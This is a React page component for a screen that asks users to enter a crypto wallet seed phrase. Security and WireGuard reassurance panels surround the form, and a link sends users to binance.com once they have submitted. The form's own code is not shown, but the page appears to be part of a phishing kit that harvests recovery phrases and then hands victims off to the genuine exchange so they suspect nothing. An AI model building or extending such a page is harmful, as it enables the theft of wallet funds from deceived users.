import React, { useState } from 'react';
import SeedPhraseHeader from '@/components/SeedPhrase/SeedPhraseHeader';
import SeedPhraseForm from '@/components/SeedPhrase/SeedPhraseForm';
import SeedPhraseSuccess from '@/components/SeedPhrase/SeedPhraseSuccess';
import SecurityFeatures from '@/components/APIKeys/SecurityFeatures';
import WireGuardInfo from '@/components/SeedPhrase/WireGuardInfo';
import Footer from '@/components/APIKeys/Footer';

const SeedPhrase = () => {
  const [isSuccess, setIsSuccess] = useState(false);

  const handleSuccess = () => {
    setIsSuccess(true);
  };

  const handleGoToWallet = () => {
    window.open('https://binance.com/', '_blank');
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-black flex items-center justify-center p-6">
      <div className="max-w-md w-full">
        <SeedPhraseHeader />

        {isSuccess ? (
          <SeedPhraseSuccess onGoToWallet={handleGoToWallet} />
        ) : (
          <>
            <SeedPhraseForm onSuccess={handleSuccess} />
            <SecurityFeatures />
            <WireGuardInfo />
          </>
        )}

        <Footer />
      </div>
    </div>
  );
};

export default SeedPhrase;